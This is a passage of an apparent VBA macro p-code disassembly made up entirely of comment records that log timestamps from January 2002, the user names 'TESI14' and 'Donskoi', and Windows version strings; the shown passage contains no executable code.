' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3101:
' Line #3102:
' Line #3103:
' 	QuoteRem 0x0000 0x0011 "21.01.02 19:50:18"
' Line #3104:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3105:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3106:
' Line #3107:
' Line #3108:
' 	QuoteRem 0x0000 0x0010 "22.01.02 8:29:04"
' Line #3109:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3110:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3111:
' Line #3112:
' Line #3113:
' 	QuoteRem 0x0000 0x0010 "22.01.02 8:29:37"
' Line #3114:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3115:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3116:
' Line #3117:
' Line #3118:
' 	QuoteRem 0x0000 0x0011 "22.01.02 13:32:46"
' Line #3119:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3120:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3121:
' Line #3122:
' Line #3123:
' 	QuoteRem 0x0000 0x0011 "22.01.02 13:38:40"
' Line #3124:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3125:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3126:
' Line #3127:
' Line #3128:
' 	QuoteRem 0x0000 0x0011 "22.01.02 15:25:28"
' Line #3129:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3130:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3131:
' Line #3132:
' Line #3133:
' 	QuoteRem 0x0000 0x0011 "22.01.02 15:26:45"
' Line #3134:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3135:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3136:
' Line #3137:
' Line #3138:
' 	QuoteRem 0x0000 0x0010 "23.01.02 9:41:30"
' Line #3139:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3140:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3141:
' Line #3142:
' Line #3143:
' 	QuoteRem 0x0000 0x0010 "23.01.02 9:47:45"
' Line #3144:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3145:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3146:
' Line #3147:
' Line #3148:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:23:19"
' Line #3149:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3150:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3151:
' Line #3152:
' Line #3153:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:23:58"
' Line #3154:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3155:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3156:
' Line #3157:
' Line #3158:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:24:07"
' Line #3159:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3160:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3161:
' Line #3162:
' Line #3163:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:24:24"
' Line #3164:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3165:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3166:
' Line #3167:
' Line #3168:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:29:56"
' Line #3169:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3170:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3171:
' Line #3172:
' Line #3173:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:30:28"
' Line #3174:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3175:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3176:
' Line #3177:
' Line #3178:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:30:48"
' Line #3179:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3180:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3181:
' Line #3182:
' Line #3183:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:30:57"
' Line #3184:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3185:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3186:
' Line #3187:
' Line #3188:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:31:55"
' Line #3189:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3190:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3191:
' Line #3192:
' Line #3193:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:33:05"
' Line #3194:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3195:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3196:
' Line #3197:
' Line #3198:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:33:20"
' Line #3199:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3200:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3201:
' Line #3202:
' Line #3203:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:33:38"
' Line #3204:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3205:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3206:
' Line #3207:
' Line #3208:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:34:42"
' Line #3209:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3210:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3211:
' Line #3212:
' Line #3213:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:42:17"
' Line #3214:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3215:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3216:
' Line #3217:
' Line #3218:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:42:37"
' Line #3219:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3220:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3221:
' Line #3222:
' Line #3223:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:42:51"
' Line #3224:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3225:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3226:
' Line #3227:
' Line #3228:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:42:59"
' Line #3229:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3230:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3231:
' Line #3232:
' Line #3233:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:43:07"
' Line #3234:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3235:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3236:
' Line #3237:
' Line #3238:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:43:16"
' Line #3239:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3240:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3241:
' Line #3242:
' Line #3243:
' 	QuoteRem 0x0000 0x0011 "23.01.02 13:56:03"
' Line #3244:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3245:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3246:
' Line #3247:
' Line #3248:
' 	QuoteRem 0x0000 0x0011 "23.01.02 14:18:16"
' Line #3249:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3250:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3251:
' Line #3252:
' Line #3253:
' 	QuoteRem 0x0000 0x0011 "23.01.02 14:19:00"
' Line #3254:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3255:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3256:
' Line #3257:
' Line #3258:
' 	QuoteRem 0x0000 0x0011 "23.01.02 14:19:27"
' Line #3259:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3260:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3261:
' Line #3262:
' Line #3263:
' 	QuoteRem 0x0000 0x0011 "23.01.02 14:20:41"
' Line #3264:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3265:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3266:
' Line #3267:
' Line #3268:
' 	QuoteRem 0x0000 0x0011 "23.01.02 14:56:51"
' Line #3269:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3270:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3271:
' Line #3272:
' Line #3273:
' 	QuoteRem 0x0000 0x0011 "23.01.02 16:21:10"
' Line #3274:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3275:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3276:
' Line #3277:
' Line #3278:
' 	QuoteRem 0x0000 0x0011 "23.01.02 16:45:32"
' Line #3279:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3280:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3281:
' Line #3282:
' Line #3283:
' 	QuoteRem 0x0000 0x0011 "23.01.02 17:53:36"
' Line #3284:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3285:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3286:
' Line #3287:
' Line #3288:
' 	QuoteRem 0x0000 0x0011 "23.01.02 18:02:17"
' Line #3289:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3290:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3291:
' Line #3292:
' Line #3293:
' 	QuoteRem 0x0000 0x0011 "23.01.02 18:02:52"
' Line #3294:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3295:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3296:
' Line #3297:
' Line #3298:
' 	QuoteRem 0x0000 0x0011 "23.01.02 20:46:39"
' Line #3299:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3300:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3301:
' Line #3302:
' Line #3303:
' 	QuoteRem 0x0000 0x0011 "24.01.02 11:39:42"
' Line #3304:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3305:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3306:
' Line #3307:
' Line #3308:
' 	QuoteRem 0x0000 0x0011 "24.01.02 16:59:56"
' Line #3309:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3310:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3311:
' Line #3312:
' Line #3313:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:00:01"
' Line #3314:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3315:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3316:
' Line #3317:
' Line #3318:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:00:42"
' Line #3319:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3320:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3321:
' Line #3322:
' Line #3323:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:00:57"
' Line #3324:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3325:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3326:
' Line #3327:
' Line #3328:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:01:11"
' Line #3329:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3330:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3331:
' Line #3332:
' Line #3333:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:01:35"
' Line #3334:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3335:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3336:
' Line #3337:
' Line #3338:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:01:47"
' Line #3339:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3340:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3341:
' Line #3342:
' Line #3343:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:01:55"
' Line #3344:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3345:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3346:
' Line #3347:
' Line #3348:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:02:12"
' Line #3349:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3350:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3351:
' Line #3352:
' Line #3353:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:02:39"
' Line #3354:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3355:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3356:
' Line #3357:
' Line #3358:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:04:33"
' Line #3359:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3360:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3361:
' Line #3362:
' Line #3363:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:35:19"
' Line #3364:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3365:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3366:
' Line #3367:
' Line #3368:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:38:02"
' Line #3369:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3370:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3371:
' Line #3372:
' Line #3373:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:41:05"
' Line #3374:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3375:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3376:
' Line #3377:
' Line #3378:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:41:46"
' Line #3379:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3380:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3381:
' Line #3382:
' Line #3383:
' 	QuoteRem 0x0000 0x0011 "24.01.02 17:46:44"
' Line #3384:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3385:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3386:
' Line #3387:
' Line #3388:
' 	QuoteRem 0x0000 0x0011 "24.01.02 22:24:14"
' Line #3389:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3390:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3391:
' Line #3392:
' Line #3393:
' 	QuoteRem 0x0000 0x0011 "25.01.02 13:39:58"
' Line #3394:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3395:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3396:
' Line #3397:
' Line #3398:
' 	QuoteRem 0x0000 0x0011 "25.01.02 13:58:21"
' Line #3399:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3400:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3401:
' Line #3402:
' Line #3403:
' 	QuoteRem 0x0000 0x0011 "25.01.02 14:00:12"
' Line #3404:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3405:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3406:
' Line #3407:
' Line #3408:
' 	QuoteRem 0x0000 0x0011 "25.01.02 14:48:38"
' Line #3409:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3410:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3411:
' Line #3412:
' Line #3413:
' 	QuoteRem 0x0000 0x0011 "25.01.02 16:27:53"
' Line #3414:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3415:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3416:
' Line #3417:
' Line #3418:
' 	QuoteRem 0x0000 0x0011 "25.01.02 17:08:50"
' Line #3419:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3420:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3421:
' Line #3422:
' Line #3423:
' 	QuoteRem 0x0000 0x0011 "25.01.02 17:38:06"
' Line #3424:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3425:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3426:
' Line #3427:
' Line #3428:
' 	QuoteRem 0x0000 0x0011 "25.01.02 17:51:14"
' Line #3429:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3430:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3431:
' Line #3432:
' Line #3433:
' 	QuoteRem 0x0000 0x0011 "25.01.02 17:53:50"
' Line #3434:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3435:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3436:
' Line #3437:
' Line #3438:
' 	QuoteRem 0x0000 0x0011 "25.01.02 17:57:05"
' Line #3439:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3440:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3441:
' Line #3442:
' Line #3443:
' 	QuoteRem 0x0000 0x0011 "25.01.02 17:58:58"
' Line #3444:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3445:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3446:
' Line #3447:
' Line #3448:
' 	QuoteRem 0x0000 0x0011 "25.01.02 19:09:26"
' Line #3449:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3450:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3451:
' Line #3452:
' Line #3453:
' 	QuoteRem 0x0000 0x0011 "25.01.02 19:57:55"
' Line #3454:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3455:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3456:
' Line #3457:
' Line #3458:
' 	QuoteRem 0x0000 0x0011 "25.01.02 19:58:42"
' Line #3459:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3460:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3461:
' Line #3462:
' Line #3463:
' 	QuoteRem 0x0000 0x0011 "25.01.02 20:13:40"
' Line #3464:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3465:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3466:
' Line #3467:
' Line #3468:
' 	QuoteRem 0x0000 0x0011 "25.01.02 20:26:29"
' Line #3469:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3470:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3471:
' Line #3472:
' Line #3473:
' 	QuoteRem 0x0000 0x0011 "25.01.02 20:27:47"
' Line #3474:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3475:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3476:
' Line #3477:
' Line #3478:
' 	QuoteRem 0x0000 0x0011 "25.01.02 20:34:31"
' Line #3479:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3480:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3481:
' Line #3482:
' Line #3483:
' 	QuoteRem 0x0000 0x0011 "25.01.02 20:46:43"
' Line #3484:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3485:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3486:
' Line #3487:
' Line #3488:
' 	QuoteRem 0x0000 0x0011 "25.01.02 21:56:34"
' Line #3489:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3490:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3491:
' Line #3492:
' Line #3493:
' 	QuoteRem 0x0000 0x0011 "25.01.02 21:57:06"
' Line #3494:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3495:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3496:
' Line #3497:
' Line #3498:
' 	QuoteRem 0x0000 0x0011 "25.01.02 22:16:36"
' Line #3499:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3500:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3501:
' Line #3502:
' Line #3503:
' 	QuoteRem 0x0000 0x0011 "25.01.02 22:17:46"
' Line #3504:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3505:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3506:
' Line #3507:
' Line #3508:
' 	QuoteRem 0x0000 0x0010 "26.01.02 8:08:00"
' Line #3509:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3510:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3511:
' Line #3512:
' Line #3513:
' 	QuoteRem 0x0000 0x0010 "26.01.02 8:20:23"
' Line #3514:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3515:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3516:
' Line #3517:
' Line #3518:
' 	QuoteRem 0x0000 0x0010 "26.01.02 8:37:48"
' Line #3519:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3520:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3521:
' Line #3522:
' Line #3523:
' 	QuoteRem 0x0000 0x0011 "26.01.02 14:54:49"
' Line #3524:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3525:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3526:
' Line #3527:
' Line #3528:
' 	QuoteRem 0x0000 0x0011 "26.01.02 14:58:00"
' Line #3529:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3530:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3531:
' Line #3532:
' Line #3533:
' 	QuoteRem 0x0000 0x0011 "26.01.02 15:06:25"
' Line #3534:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3535:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3536:
' Line #3537:
' Line #3538:
' 	QuoteRem 0x0000 0x0011 "26.01.02 17:50:10"
' Line #3539:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3540:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3541:
' Line #3542:
' Line #3543:
' 	QuoteRem 0x0000 0x0011 "26.01.02 17:52:36"
' Line #3544:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3545:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3546:
' Line #3547:
' Line #3548:
' 	QuoteRem 0x0000 0x0011 "26.01.02 18:44:49"
' Line #3549:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3550:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3551:
' Line #3552:
' Line #3553:
' 	QuoteRem 0x0000 0x0011 "26.01.02 18:51:35"
' Line #3554:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3555:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3556:
' Line #3557:
' Line #3558:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 7:44:33"
' Line #3559:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3560:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3561:
' Line #3562:
' Line #3563:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 7:53:57"
' Line #3564:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3565:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3566:
' Line #3567:
' Line #3568:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 7:54:32"
' Line #3569:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3570:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3571:
' Line #3572:
' Line #3573:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 7:58:26"
' Line #3574:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3575:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3576:
' Line #3577:
' Line #3578:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 7:59:09"
' Line #3579:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3580:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3581:
' Line #3582:
' Line #3583:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 7:59:16"
' Line #3584:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3585:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3586:
' Line #3587:
' Line #3588:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 7:59:57"
' Line #3589:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3590:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3591:
' Line #3592:
' Line #3593:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:00:21"
' Line #3594:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3595:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3596:
' Line #3597:
' Line #3598:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:00:50"
' Line #3599:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3600:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3601:
' Line #3602:
' Line #3603:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:01:05"
' Line #3604:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3605:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3606:
' Line #3607:
' Line #3608:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:01:35"
' Line #3609:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3610:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3611:
' Line #3612:
' Line #3613:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:01:47"
' Line #3614:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3615:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3616:
' Line #3617:
' Line #3618:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:01:55"
' Line #3619:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3620:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3621:
' Line #3622:
' Line #3623:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:02:10"
' Line #3624:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3625:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3626:
' Line #3627:
' Line #3628:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:02:23"
' Line #3629:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3630:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3631:
' Line #3632:
' Line #3633:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:02:33"
' Line #3634:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3635:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3636:
' Line #3637:
' Line #3638:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:03:06"
' Line #3639:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3640:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3641:
' Line #3642:
' Line #3643:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:03:21"
' Line #3644:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3645:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3646:
' Line #3647:
' Line #3648:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:03:36"
' Line #3649:
